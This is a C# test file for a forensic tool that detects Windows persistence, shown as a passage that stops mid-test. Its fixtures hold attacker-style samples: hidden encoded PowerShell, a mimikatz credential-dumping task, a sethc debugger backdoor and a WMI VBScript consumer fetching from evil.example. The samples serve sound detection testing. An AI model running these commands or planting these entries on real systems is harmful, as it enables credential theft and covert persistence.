using System.Security.Cryptography;
using System.Text;
using EzForensics.Core.Execution;
using EzForensics.Core.Persistence;
using EzForensics.Core.Sysinternals;
using EzForensics.Core.SystemInfo;
using EzForensics.Core.Triage;
using FluentAssertions;

namespace EzForensics.Core.Tests;

public class PersistenceRegistryTests
{
    private static readonly DateTime T1 = new(2025, 4, 15, 9, 4, 27, DateTimeKind.Utc);

    private static InMemoryHive Software()
    {
        var h = new InMemoryHive("SOFTWARE");
        var run = h.Key(@"Microsoft\Windows\CurrentVersion\Run");
        run.LastWrite = T1;
        run.With(RegValue.Sz("UpdateSvc", @"C:\TMP\p.exe -s \\10.34.2.3 'net user'"), RegValue.Sz("SecurityHealth", @"%windir%\system32\SecurityHealthSystray.exe", RegType.ExpandSz),
            RegValue.Sz("Ps", "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"));
        // Disabled in StartupApproved (odd first byte + FILETIME of the change).
        var ft = BitConverter.GetBytes(T1.ToFileTimeUtc());
        h.Key(@"Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run").With(RegValue.Bin("SecurityHealth", new byte[] { 3, 0, 0, 0 }.Concat(ft).ToArray()));
        h.Key(@"WOW6432Node\Microsoft\Windows\CurrentVersion\Run").With(RegValue.Sz("Wow", @"C:\Program Files (x86)\x\x.exe"));
        h.Key(@"Microsoft\Windows NT\CurrentVersion\Winlogon").With(RegValue.Sz("Shell", "explorer.exe, evil.exe"), RegValue.Sz("Userinit", @"C:\Windows\system32\userinit.exe,"));
        h.Key(@"Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe").With(RegValue.Sz("Debugger", @"C:\Windows\System32\cmd.exe"));
        h.Key(@"Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe").With(RegValue.Dword("GlobalFlag", 0x200));
        h.Key(@"Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe").With(RegValue.Sz("MonitorProcess", @"C:\Users\Public\m.exe"), RegValue.Dword("ReportingMode", 1));
        h.Key(@"Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe").With(RegValue.Dword("MitigationOptions", 1)); // not an ASEP
        h.Key(@"Microsoft\Windows NT\CurrentVersion\Windows").With(RegValue.Sz("AppInit_DLLs", @"C:\x\a.dll,C:\x\b.dll"), RegValue.Dword("LoadAppInit_DLLs", 1));
        h.Key(@"Microsoft\Active Setup\Installed Components\{AAAA}").With(RegValue.Sz("StubPath", @"C:\Users\Public\stub.exe"));
        h.Key(@"Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\{BBBB}");
        h.Key(@"Classes\CLSID\{BBBB}\InprocServer32").With(RegValue.Sz("", @"C:\Program Files\bho\bho.dll"));
        h.Key(@"Classes\CLSID\{CCCC}\InprocServer32").With(RegValue.Sz("", @"%SystemRoot%\system32\shell32.dll"));
        h.Key(@"Microsoft\Windows\CurrentVersion\Shell Extensions\Approved").With(RegValue.Sz("{BBBB}", "My ext"), RegValue.Sz("{CCCC}", "Windows ext"));
        h.Key(@"Microsoft\NetSh").With(RegValue.Sz("helper", "evilhelper.dll"));
        h.Key(@"Microsoft\Command Processor").With(RegValue.Sz("AutoRun", "cmd /c calc.exe"));
        return h;
    }

    private static InMemoryHive SystemHive()
    {
        var h = new InMemoryHive("SYSTEM");
        h.Key("Select").With(RegValue.Dword("Current", 1));
        h.Key(@"ControlSet001\Control\Session Manager").With(RegValue.Multi("BootExecute", "autocheck autochk *", "evilboot"));
        h.Key(@"ControlSet001\Control\Lsa").With(RegValue.Multi("Authentication Packages", "msv1_0"), RegValue.Multi("Notification Packages", "scecli", "mimilib"),
            RegValue.Multi("Security Packages", "\"\""));
        h.Key(@"ControlSet001\Control\Print\Monitors\Local Port").With(RegValue.Sz("Driver", "localspl.dll"));
        h.Key(@"ControlSet001\Control\Session Manager\AppCertDlls").With(RegValue.Sz("x", @"C:\x\cert.dll"));
        var svc = h.Key(@"ControlSet001\Services\EvilSvc");
        svc.LastWrite = T1;
        svc.With(RegValue.Dword("Type", 0x20), RegValue.Dword("Start", 2), RegValue.Sz("ImagePath", @"%SystemRoot%\system32\svchost.exe -k netsvcs", RegType.ExpandSz),
            RegValue.Sz("ObjectName", "LocalSystem"));
        h.Key(@"ControlSet001\Services\EvilSvc\Parameters").With(RegValue.Sz("ServiceDll", @"C:\ProgramData\evil.dll", RegType.ExpandSz));
        h.Key(@"ControlSet001\Services\disk").With(RegValue.Dword("Type", 1), RegValue.Dword("Start", 0));
        h.Key(@"ControlSet001\Services\Off").With(RegValue.Dword("Type", 0x10), RegValue.Dword("Start", 4), RegValue.Sz("ImagePath", @"C:\off.exe"));
        h.Key(@"ControlSet001\Services\NotAService"); // no Type: skipped
        h.Key(@"ControlSet001\Services\W32Time\TimeProviders\NtpClient").With(RegValue.Sz("DllName", @"%systemroot%\system32\w32time.dll"), RegValue.Dword("Enabled", 1));
        h.Key(@"ControlSet001\Control\Terminal Server\WinStations\RDP-Tcp").With(RegValue.Sz("InitialProgram", @"C:\x\rdp.exe"));
        h.Key(@"ControlSet001\Control\TimeZoneInformation").With(RegValue.Dword("ActiveTimeBias", unchecked((uint)-240)));
        return h;
    }

    [Fact]
    public void Software_hive_aseps_are_found_and_flagged()
    {
        var r = new PersistenceResult();
        RegistryAseps.FromSoftware(Software(), r);
        var run = r.Entries.Where(e => e.Category == PersistenceCategory.RunKeys).ToList();
        run.Should().HaveCount(4);
        var upd = run.Single(e => e.EntryName == "UpdateSvc");
        upd.Location.Should().Be(@"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run");
        upd.Source.Should().Be(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run\UpdateSvc");
        upd.ImagePath.Should().Be(@"C:\TMP\p.exe");
        upd.KeyLastWriteUtc.Should().Be(T1);
        upd.Flags.Should().Contain(PersistenceHeuristics.UserWritable).And.Contain(PersistenceHeuristics.NetworkPath);
        var sh = run.Single(e => e.EntryName == "SecurityHealth");
        sh.Enabled.Should().Be("No");
        sh.Notes.Should().Contain("Disabled in StartupApproved at 2025-04-15 09:04:27 UTC");
        sh.Flags.Should().BeEmpty();
        run.Single(e => e.EntryName == "Ps").Flags.Should().Contain(PersistenceHeuristics.EncodedPowerShell).And.Contain("ScriptOrLolbin:powershell");
        run.Single(e => e.EntryName == "Wow").Location.Should().Contain("WOW6432Node");

        var wl = r.Entries.Where(e => e.Category == PersistenceCategory.Winlogon).ToList();
        wl.Single(e => e.EntryName == "Shell").Flags.Should().Contain(PersistenceHeuristics.NonDefaultValue);
        wl.Single(e => e.EntryName == "Userinit").Flags.Should().BeEmpty();

        var ifeo = r.Entries.Where(e => e.Category == PersistenceCategory.ImageHijacks).ToList();
        ifeo.Should().HaveCount(2);
        ifeo.Single(e => e.EntryName.StartsWith("sethc")).Flags.Should().Contain(PersistenceHeuristics.IfeoDebugger);
        var spe = ifeo.Single(e => e.EntryName.StartsWith("notepad"));
        spe.Command.Should().Be(@"C:\Users\Public\m.exe");
        spe.Flags.Should().Contain(PersistenceHeuristics.SilentExit).And.Contain(PersistenceHeuristics.UserWritable);

        r.Entries.Where(e => e.Category == PersistenceCategory.AppInit).Select(e => e.Command).Should().Equal(@"C:\x\a.dll", @"C:\x\b.dll");
        r.Entries.First(e => e.Category == PersistenceCategory.AppInit).Flags.Should().Contain(PersistenceHeuristics.AppInitLoaded);
        r.Entries.Single(e => e.Category == PersistenceCategory.ActiveSetup).Command.Should().Be(@"C:\Users\Public\stub.exe");
        r.Entries.Single(e => e.EntryName.EndsWith("(BHO)")).ImagePath.Should().Be(@"C:\Program Files\bho\bho.dll");
        var ext = r.Entries.Where(e => e.Location.EndsWith("Approved")).ToList();
        ext.Should().HaveCount(2, "the non-Windows extension plus the summary row");
        ext.Single(e => e.EntryName == "(summary)").Command.Should().StartWith("2 approved shell extensions: 1 outside");
        r.Entries.Single(e => e.Category == PersistenceCategory.Netsh).Command.Should().Be("evilhelper.dll");
        r.Entries.Single(e => e.Category == PersistenceCategory.CommandProcessor).Flags.Should().Contain("ScriptOrLolbin:cmd");
    }

    [Fact]
    public void System_hive_aseps_services_and_lsa()
    {
        var r = new PersistenceResult();
        RegistryAseps.FromSystem(SystemHive(), r);
        var boot = r.Entries.Where(e => e.Category == PersistenceCategory.BootExecute).ToList();
        boot.Select(e => e.Command).Should().Equal("autocheck autochk *", "evilboot");
        boot[0].Flags.Should().BeEmpty();
        boot[1].Flags.Should().Contain(PersistenceHeuristics.NonDefaultValue);
        var lsa = r.Entries.Where(e => e.Category == PersistenceCategory.Lsa).ToList();
        lsa.Select(e => e.EntryName).Should().BeEquivalentTo("Authentication Packages: msv1_0", "Notification Packages: scecli", "Notification Packages: mimilib");
        lsa.Single(e => e.Command == "mimilib").Flags.Should().Contain(PersistenceHeuristics.NonDefaultValue);
        lsa.Single(e => e.Command == "scecli").Flags.Should().BeEmpty();

        var evil = r.Entries.Single(e => e.EntryName == "EvilSvc");
        evil.Category.Should().Be(PersistenceCategory.Services);
        evil.ImagePath.Should().Be(@"C:\ProgramData\evil.dll");
        evil.Enabled.Should().Be("Yes");
        evil.Notes.Should().Contain("Start=Automatic").And.Contain("Type=Shared process").And.Contain("Account=LocalSystem");
        evil.Flags.Should().Contain(PersistenceHeuristics.UserWritable);
        evil.Flags.Should().NotContain(f => f.StartsWith("ScriptOrLolbin"), "svchost from System32 is how Windows hosts services");
        var disk = r.Entries.Single(e => e.EntryName == "disk");
        disk.Category.Should().Be(PersistenceCategory.Drivers);
        disk.Command.Should().Be(@"System32\drivers\disk.sys");
        r.Entries.Single(e => e.EntryName == "Off").Enabled.Should().Be("No");
        r.Entries.Should().NotContain(e => e.EntryName == "NotAService");
        r.Entries.Single(e => e.Category == PersistenceCategory.Print).EntryName.Should().Be("Local Port");
        r.Entries.Single(e => e.Category == PersistenceCategory.AppCert).Command.Should().Be(@"C:\x\cert.dll");
        r.Entries.Single(e => e.Category == PersistenceCategory.TimeProviders).Enabled.Should().Be("Yes");
        r.Entries.Single(e => e.Category == PersistenceCategory.TerminalServer).Command.Should().Be(@"C:\x\rdp.exe");
    }

    [Fact]
    public void User_hives_run_keys_logon_script_and_com_hijack()
    {
        var nt = new InMemoryHive("NTUSER.DAT");
        nt.Key(@"Software\Microsoft\Windows\CurrentVersion\Run").With(RegValue.Sz("OneDrive", @"""C:\Users\bob\AppData\Local\Microsoft\OneDrive\OneDrive.exe"" /background"));
        nt.Key(@"Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run").With(RegValue.Bin("OneDrive", new byte[12] { 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 }));
        nt.Key("Environment").With(RegValue.Sz("UserInitMprLogonScript", @"C:\TMP\mim.exe"));
        nt.Key(@"Software\Classes\CLSID\{HIJACK}\InprocServer32").With(RegValue.Sz("", @"C:\Users\bob\AppData\Roaming\h.dll"));
        nt.Key(@"Control Panel\Desktop").With(RegValue.Sz("SCRNSAVE.EXE", @"C:\Users\bob\evil.scr"), RegValue.Sz("ScreenSaveActive", "1"));
        var uc = new InMemoryHive("UsrClass.dat");
        uc.Key(@"CLSID\{OWN}\LocalServer32").With(RegValue.Sz("", @"""C:\Users\bob\AppData\Local\x.exe"" /x"));
        var sw = new InMemoryHive("SOFTWARE");
        sw.Key(@"Classes\CLSID\{HIJACK}\InprocServer32").With(RegValue.Sz("", @"%SystemRoot%\system32\real.dll"));

        var r = new PersistenceResult();
        RegistryAseps.FromUser(nt, "bob", r, null, sw);
        RegistryAseps.FromUserClasses(uc, "bob", r, null, sw);
        var od = r.Entries.Single(e => e.EntryName == "OneDrive");
        od.Location.Should().Be(@"HKCU\Software\Microsoft\Windows\CurrentVersion\Run");
        od.User.Should().Be("bob");
        od.Enabled.Should().Be("Yes");
        od.ImagePath.Should().Be(@"C:\Users\bob\AppData\Local\Microsoft\OneDrive\OneDrive.exe");
        od.Source.Should().StartWith("NTUSER.DAT[bob]");
        r.Entries.Single(e => e.Category == PersistenceCategory.LogonScripts).Flags.Should().Contain(PersistenceHeuristics.NonDefaultValue);
        r.Entries.Single(e => e.Category == PersistenceCategory.Screensaver).Notes.Should().Contain("ScreenSaveActive=1");
        var com = r.Entries.Where(e => e.Category == PersistenceCategory.ComHijack).ToList();
        com.Should().HaveCount(2);
        com.Single(e => e.EntryName.StartsWith("{HIJACK}")).Flags.Should().Contain(PersistenceHeuristics.ComShadowsHklm);
        com.Single(e => e.EntryName.StartsWith("{OWN}")).ImagePath.Should().Be(@"C:\Users\bob\AppData\Local\x.exe");
        com.Single(e => e.EntryName.StartsWith("{OWN}")).Source.Should().StartWith("UsrClass.dat[bob]");
    }

    [Theory]
    [InlineData(@"""C:\Program Files\x\a.exe"" /s", @"C:\Program Files\x\a.exe")]
    [InlineData(@"C:\Program Files\x\a.exe /s", @"C:\Program Files\x\a.exe")]
    [InlineData(@"rundll32.exe shell32.dll,Control_RunDLL", "rundll32.exe")]
    [InlineData("notepad", "notepad")]
    [InlineData("", "")]
    public void Image_from_command(string cmd, string image) => PersistenceHeuristics.ImageFromCommand(cmd).Should().Be(image);

    [Theory]
    [InlineData(@"%windir%\system32\rundll32.exe %windir%\system32\PcaSvc.dll,PcaPatchSdbTask", false)]
    [InlineData(@"%windir%\system32\rundll32.exe Startupscan.dll,SusRunTask", false)]
    [InlineData(@"%windir%\system32\rundll32.exe C:\Users\bob\AppData\x.dll,Run", true)]
    [InlineData(@"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication""", true)]
    [InlineData(@"C:\Windows\System32\mshta.exe http://x/y.hta", true)]
    public void Lolbin_flag_skips_windows_own_dll_hosting(string cmd, bool flagged)
    {
        var e = new PersistenceEntry { Command = cmd, ImagePath = PersistenceHeuristics.ImageFromCommand(cmd) };
        PersistenceHeuristics.Apply(e, null);
        e.Flags.Any(f => f.StartsWith(PersistenceHeuristics.ScriptHost)).Should().Be(flagged);
    }

    [Fact]
    public void Offline_path_resolution_and_missing_image_check()
    {
        using var t = new TempDir();
        var root = t.Path;
        Directory.CreateDirectory(Path.Combine(root, "Program Files", "App"));
        File.WriteAllText(Path.Combine(root, "Program Files", "App", "other.exe"), "x");
        OfflinePath.Resolve(@"%SystemRoot%\system32\x.dll", root).Should().Be(Path.Combine(root, "Windows", "system32", "x.dll"));
        OfflinePath.Resolve(@"\SystemRoot\System32\drivers\a.sys", root).Should().Be(Path.Combine(root, "Windows", "System32", "drivers", "a.sys"));
        OfflinePath.Resolve(@"System32\drivers\a.sys", root).Should().Be(Path.Combine(root, "Windows", "System32", "drivers", "a.sys"));
        OfflinePath.Resolve(@"\??\C:\x\y.exe", root).Should().Be(Path.Combine(root, "x", "y.exe"));
        OfflinePath.Resolve(@"%APPDATA%\a.exe", root, "bob").Should().Be(Path.Combine(root, "Users", "bob", "AppData", "Roaming", "a.exe"));
        OfflinePath.Resolve(@"%APPDATA%\a.exe", root).Should().BeNull("no profile for a machine-wide entry");
        OfflinePath.Resolve("notepad.exe", root).Should().BeNull();
        OfflinePath.Resolve(@"C:\..\..\..\..\Windows\notepad.exe", root).Should().BeNull("a '..' in evidence must not leave the evidence root");
        OfflinePath.Resolve(@"%APPDATA%\..\..\..\..\..\..\x.exe", root, "bob").Should().BeNull();
        var chk = new OfflineChecker(root);
        chk.IsMissing(@"C:\Program Files\App\gone.exe", null).Should().BeTrue("the folder was collected with other programs in it");
        chk.IsMissing(@"C:\Program Files\App\other.exe", null).Should().BeFalse();
        chk.IsMissing(@"C:\Windows\System32\notcollected.exe", null).Should().BeFalse("the folder is not in the collection");
    }
}

public class PersistenceTaskTests
{
    private const string TaskXml = """
        <?xml version="1.0" encoding="UTF-16"?>
        <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
          <RegistrationInfo><Date>2025-04-15T13:04:43</Date><Author>DESKTOP\Testuser</Author><URI>\GameOver</URI></RegistrationInfo>
          <Triggers><TimeTrigger><Repetition><Interval>PT5M</Interval></Repetition><StartBoundary>2025-04-15T13:04:00</StartBoundary><Enabled>true</Enabled></TimeTrigger><LogonTrigger><Enabled>false</Enabled></LogonTrigger></Triggers>
          <Settings><Enabled>true</Enabled><Hidden>true</Hidden></Settings>
          <Actions Context="Author"><Exec><Command>C:\TMP\mim.exe</Command><Arguments>sekurlsa::LogonPasswords &gt; C:\TMP\o.txt</Arguments></Exec>
            <ComHandler><ClassId>{AE31B729-D5FD-401E-AF42-784074835AFE}</ClassId><Data>-x</Data></ComHandler></Actions>
          <Principals><Principal id="Author"><UserId>DESKTOP\Testuser</UserId><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
        </Task>
        """;

    [Fact]
    public void Parses_utf16_task_xml_file()
    {
        using var t = new TempDir();
        var dir = Path.Combine(t.Path, "Windows", "System32", "Tasks", "Sub");
        Directory.CreateDirectory(dir);
        var f = Path.Combine(dir, "GameOver");
        File.WriteAllText(f, TaskXml, new UnicodeEncoding(false, true));
        var info = ScheduledTasks.ParseFile(f, Path.Combine(t.Path, "Windows", "System32", "Tasks"));
        info.Error.Should().BeNull();
        info.TaskPath.Should().Be(@"\GameOver", "the URI wins over the file location");
        info.Author.Should().Be(@"DESKTOP\Testuser");
        info.RegistrationDateRaw.Should().Be("2025-04-15T13:04:43");
        info.Hidden.Should().BeTrue();
        info.RunLevel.Should().Be("HighestAvailable");
        info.Triggers.Should().Equal("TimeTrigger start 2025-04-15T13:04:00 every PT5M", "LogonTrigger (disabled)");
        info.Actions.Should().HaveCount(2);
        info.Actions[0].CommandLine.Should().Be(@"C:\TMP\mim.exe sekurlsa::LogonPasswords > C:\TMP\o.txt");
        info.Actions[1].CommandLine.Should().Be("COM handler {AE31B729-D5FD-401E-AF42-784074835AFE} data -x");

        // No TaskCache: registration converted with the system's ActiveTimeBias (UTC = local + bias; -240 = UTC+4).
        var list = new List<ScheduledTaskInfo> { info };
        ScheduledTasks.MergeTaskCache(list, null, -240, new List<string>());
        info.RegisteredUtc.Should().Be(new DateTime(2025, 4, 15, 9, 4, 43, DateTimeKind.Utc));
        var entries = ScheduledTasks.ToEntries(info).ToList();
        entries.Should().HaveCount(2);
        entries[0].Flags.Should().Contain(PersistenceHeuristics.HiddenTask);
        entries[0].TaskRegisteredUtc.Should().Be(info.RegisteredUtc);
        entries[0].Primary.Description.Should().Be("Task registered");
    }

    [Fact]
    public void TaskCache_gives_utc_registration_and_finds_tasks_without_xml()
    {
        var sw = new InMemoryHive("SOFTWARE");
        var created = new DateTime(2025, 4, 15, 9, 4, 43, 300, DateTimeKind.Utc);
        var dyn = new byte[28];
        BitConverter.GetBytes(created.ToFileTimeUtc()).CopyTo(dyn, 4);
        BitConverter.GetBytes(created.AddMinutes(20).ToFileTimeUtc()).CopyTo(dyn, 12);
        sw.Key(ScheduledTasks.TaskCacheKey + @"\Tasks\{1111}").With(RegValue.Sz("Path", @"\GameOver"), RegValue.Bin("DynamicInfo", dyn));
        // Exec action blob as written by Windows 10: version 3, context "Author", Exec (0x6666) id "", command, args, workdir, flags.
        var blob = ActionsBlob("Author", @"C:\TMP\deleted.exe", "-x");
        sw.Key(ScheduledTasks.TaskCacheKey + @"\Tasks\{2222}").With(RegValue.Sz("Path", @"\Deleted"), RegValue.Bin("Actions", blob), RegValue.Bin("DynamicInfo", dyn));
        var tasks = new List<ScheduledTaskInfo> { new() { TaskPath = @"\GameOver", XmlFile = "x", RegistrationDateRaw = "2025-04-15T13:04:43" } };
        ScheduledTasks.MergeTaskCache(tasks, sw, -240, new List<string>());
        tasks.Should().HaveCount(2);
        tasks[0].RegisteredUtc.Should().Be(created);
        tasks[0].RegisteredSource.Should().Contain("DynamicInfo");
        tasks[0].LastRunUtc.Should().Be(created.AddMinutes(20));
        var deleted = tasks[1];
        deleted.XmlMissing.Should().BeTrue();
        deleted.Actions.Single().CommandLine.Should().Be(@"C:\TMP\deleted.exe -x");
        ScheduledTasks.ToEntries(deleted).Single().Flags.Should().Contain(PersistenceHeuristics.TaskXmlMissing);
        ScheduledTasks.ToEntries(deleted, tasksFolderCollected: false).Single().Flags.Should().NotContain(PersistenceHeuristics.TaskXmlMissing);
    }

    [Fact]
    public void Parses_com_handler_action_blob_from_a_real_hive()
    {
        // TaskCache\Tasks\{...}\Actions of \Microsoft\Windows\DeviceDirectoryClient\HandleWnsCommand (samples\C SOFTWARE).
        var b = Convert.FromHexString("03000C000000530079007300740065006D0077770000000029B731AEFDD51E40AF42784074835AFE160000002D0057006E00730043006F006D006D0061006E006400");
        ScheduledTasks.ParseActions(b).Single().CommandLine.Should().Be("COM handler {ae31b729-d5fd-401e-af42-784074835afe} data -WnsCommand");
    }

    internal static byte[] ActionsBlob(string context, string cmd, string args)
    {
        var ms = new MemoryStream();
        void U16(ushort v) => ms.Write(BitConverter.GetBytes(v));
        void S(string s) { var b = Encoding.Unicode.GetBytes(s); ms.Write(BitConverter.GetBytes(b.Length)); ms.Write(b); }
        U16(3); S(context); U16(0x6666); S(""); S(cmd); S(args); S(""); U16(0);
        return ms.ToArray();
    }
}

public class PersistenceWmiLnkTests
{
    /// <summary>A synthetic OBJECTS.DATA page laid out like the real records (class name, binary, NUL-separated strings).</summary>
    internal static byte[] FakeRepository()
    {
        var sb = new StringBuilder();
        sb.Append('\x01', 3000);
        sb.Append("\0__EventFilter\0\x12\x34\x00\x00\x08\0ROOT\\cimv2\0\0TimingIntervalTrigger\0\0SELECT * FROM __TimerEvent WHERE TimerID = 'Timer'\0\0WQL\0\x07\x01\x02");
        sb.Append('\x02', 500);
        sb.Append("\0ActiveScriptEventConsumer\0\x01\x02\x03\x00\x05\0\0LaunchBeaconingBackdoor\0\0VBScript\0\0Set o = CreateObject(\"MSXML2.XMLHTTP\")\r\no.Open \"GET\", \"http://evil.example/x\"\0\x03\x01");
        sb.Append('\x03', 500);
        sb.Append("\0CommandLineEventConsumer\0\x04\x05\0\0Runner\0\0C:\\Users\\Public\\run.exe -q\0\x01\x02");
        sb.Append('\x04', 500);
        sb.Append("\0__FilterToConsumerBinding\0ActiveScriptEventConsumer.Name=\"LaunchBeaconingBackdoor\"\0__EventFilter.Name=\"TimingIntervalTrigger\"\0");
        sb.Append("\0__FilterToConsumerBinding\0CommandLineEventConsumer.Name=\"Runner\"\0__EventFilter.Name=\"TimingIntervalTrigger\"\0");
        sb.Append("\0__FilterToConsumerBinding\0NTEventLogEventConsumer.Name=\"SCM Event Log Consumer\"\0__EventFilter.Name=\"SCM Event Log Filter\"\0");
        return Encoding.Latin1.GetBytes(sb.ToString());
    }

    [Fact]
    public void Wmi_bindings_consumers_and_filters_are_carved()
    {
        var found = WmiPersistence.Scan(new MemoryStream(FakeRepository()));
        found.Should().HaveCount(3);
        var b = found.Single(f => f.ConsumerName == "LaunchBeaconingBackdoor");
        b.ConsumerType.Should().Be("ActiveScriptEventConsumer");
        b.ScriptingEngine.Should().Be("VBScript");
        b.Command.Should().Contain("http://evil.example/x");
        b.FilterQuery.Should().Be("SELECT * FROM __TimerEvent WHERE TimerID = 'Timer'");
        b.Namespace.Should().Be(@"ROOT\cimv2");
        var c = found.Single(f => f.ConsumerName == "Runner");
        c.Command.Should().Be(@"C:\Users\Public\run.exe -q");
        var e = WmiPersistence.ToEntry(c, "OBJECTS.DATA");
        PersistenceHeuristics.Apply(e, null);
        e.Flags.Should().Contain(PersistenceHeuristics.WmiConsumer).And.Contain(PersistenceHeuristics.UserWritable);
        found.Single(f => f.ConsumerName == "SCM Event Log Consumer").LikelyLegitimate.Should().BeTrue();
    }

    [Fact]
    public void Wmi_scan_spans_chunk_boundaries()
    {
        // Pad so the records straddle the 16 MB chunk edge.
        var pad = new byte[(16 << 20) + (256 << 10) - 2000];
        var data = pad.Concat(FakeRepository()).ToArray();
        WmiPersistence.Scan(new MemoryStream(data)).Should().HaveCount(3);
        WmiPersistence.Scan(new MemoryStream(new byte[1000])).Should().BeEmpty();
    }

    /// <summary>Minimal shell link: header + LinkInfo (local base path) + unicode arguments.</summary>
    internal static byte[] Lnk(string target, string args)
    {
        var ms = new MemoryStream();
        var w = new BinaryWriter(ms);
        w.Write(0x4C); w.Write(new byte[16]); w.Write(0x2 | 0x20 | 0x80); // HasLinkInfo | HasArguments | IsUnicode
        w.Write(0); w.Write(0L); w.Write(0L); w.Write(DateTime.UtcNow.ToFileTimeUtc()); w.Write(0); w.Write(0); w.Write(1); w.Write((short)0); w.Write(new byte[10]);
        var basePath = Encoding.Latin1.GetBytes(target + "\0");
        int headerSize = 0x1C, size = headerSize + basePath.Length + 1;
        w.Write(size); w.Write(headerSize); w.Write(1); w.Write(0); w.Write(headerSize); w.Write(0); w.Write(headerSize + basePath.Length);
        w.Write(basePath); w.Write((byte)0);
        w.Write((ushort)args.Length); w.Write(Encoding.Unicode.GetBytes(args));
        return ms.ToArray();
    }

    [Fact]
    public void Lnk_target_and_arguments()
    {
        var info = LnkTarget.Parse(Lnk(@"C:\Users\Public\evil.exe", "-hidden"));
        info.Should().NotBeNull();
        info!.Target.Should().Be(@"C:\Users\Public\evil.exe");
        info.Arguments.Should().Be("-hidden");
        LnkTarget.Parse(new byte[10]).Should().BeNull();
    }
}

public class PersistenceCollectorTests
{
    private sealed class MapOpener : IHiveOpener
    {
        public Dictionary<string, InMemoryHive> Hives { get; } = new(StringComparer.OrdinalIgnoreCase);
        public IRegistryHive Open(string hivePath, string name) => Hives.TryGetValue(name, out var h) ? h : throw new InvalidDataException("not a hive");
    }

    internal static string BuildEvidence(string root)
    {
        var config = Path.Combine(root, "Windows", "System32", "config");
        Directory.CreateDirectory(config);
        File.WriteAllText(Path.Combine(config, "SOFTWARE"), "regf");
        File.WriteAllText(Path.Combine(config, "SYSTEM"), "regf");
        var tasks = Path.Combine(root, "Windows", "System32", "Tasks");
        Directory.CreateDirectory(tasks);
        File.WriteAllText(Path.Combine(tasks, "Updater"), """
            <?xml version="1.0" encoding="UTF-16"?><Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"><RegistrationInfo><URI>\Updater</URI></RegistrationInfo>
            <Actions><Exec><Command>powershell.exe</Command><Arguments>-enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAp</Arguments></Exec></Actions></Task>
            """, new UnicodeEncoding(false, true));
        File.WriteAllText(Path.Combine(tasks, "broken"), "not xml");
        var wbem = Path.Combine(root, "Windows", "System32", "wbem", "Repository");
        Directory.CreateDirectory(wbem);
        File.WriteAllBytes(Path.Combine(wbem, "OBJECTS.DATA"), PersistenceWmiLnkTests.FakeRepository());
        var bob = Path.Combine(root, "Users", "bob");
        var startup = Path.Combine(bob, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup");
        Directory.CreateDirectory(startup);
        File.WriteAllText(Path.Combine(bob, "NTUSER.DAT"), "regf");
        File.WriteAllBytes(Path.Combine(startup, "evil.lnk"), PersistenceWmiLnkTests.Lnk(@"C:\Users\Public\evil.exe", "-hidden"));
        File.WriteAllText(Path.Combine(startup, "desktop.ini"), "[.ShellClassInfo]");
        var common = Path.Combine(root, "ProgramData", "Microsoft", "Windows", "Start Menu", "Programs", "Startup");
        Directory.CreateDirectory(common);
        File.WriteAllText(Path.Combine(common, "run.bat"), "@echo off");
        return root;
    }

    [Fact]
    public void Collects_every_location_and_writes_csvs()
    {
        using var t = new TempDir();
        var root = BuildEvidence(Path.Combine(t.Path, "C"));
        var before = Hashes(root);
        var opener = new MapOpener();
        var sw = new InMemoryHive("SOFTWARE");
        sw.Key(@"Microsoft\Windows\CurrentVersion\Run").With(RegValue.Sz("UpdateSvc", @"C:\TMP\p.exe"));
        opener.Hives["SOFTWARE"] = sw;
        var sys = new InMemoryHive("SYSTEM");
        sys.Key("Select").With(RegValue.Dword("Current", 1));
        sys.Key(@"ControlSet001\Services\x").With(RegValue.Dword("Type", 0x10), RegValue.Dword("Start", 2), RegValue.Sz("ImagePath", @"C:\x.exe"));
        opener.Hives["SYSTEM"] = sys;
        var nt = new InMemoryHive("NTUSER");
        nt.Key(@"Software\Microsoft\Windows\CurrentVersion\Run").With(RegValue.Sz("bobrun", @"C:\Users\bob\AppData\x.exe"));
        opener.Hives["NTUSER.DAT[bob]"] = nt;

        var r = new PersistenceCollector(opener).Collect(root);
        var counts = r.CountsByCategory();
        counts[PersistenceCategory.RunKeys].Should().Be(2);
        counts[PersistenceCategory.Services].Should().Be(1);
        counts[PersistenceCategory.ScheduledTasks].Should().Be(2, "the broken XML is still listed, with its error");
        counts[PersistenceCategory.StartupFolder].Should().Be(2);
        counts[PersistenceCategory.Wmi].Should().Be(3);
        r.Tasks.Single(x => x.TaskPath == @"\broken").Error.Should().NotBeNull();
        r.Entries.Single(e => e.EntryName == @"\Updater").Flags.Should().Contain(PersistenceHeuristics.EncodedPowerShell);
        var lnk = r.Entries.Single(e => e.EntryName == "evil.lnk");
        lnk.Command.Should().Be(@"C:\Users\Public\evil.exe -hidden");
        lnk.User.Should().Be("bob");
        lnk.FileModifiedUtc.Should().NotBeNull();
        r.Entries.Single(e => e.EntryName == "run.bat").Location.Should().Be("Startup folder (All Users)");

        var outDir = Path.Combine(t.Path, "case", "Persistence", "EzHub");
        var files = PersistenceCollector.Write(r, outDir);
        files.Select(Path.GetFileName).Should().Equal(PersistenceCollector.MainCsv, PersistenceCollector.TasksCsv, PersistenceCollector.WmiCsv);
        var lines = File.ReadAllLines(files[0]);
        lines[0].Should().Be(string.Join(",", PersistenceCollector.Headers));
        lines.Should().Contain(l => l.Contains("UpdateSvc") && l.Contains("Run keys"));
        Hashes(root).Should().Equal(before, "the evidence is never written");

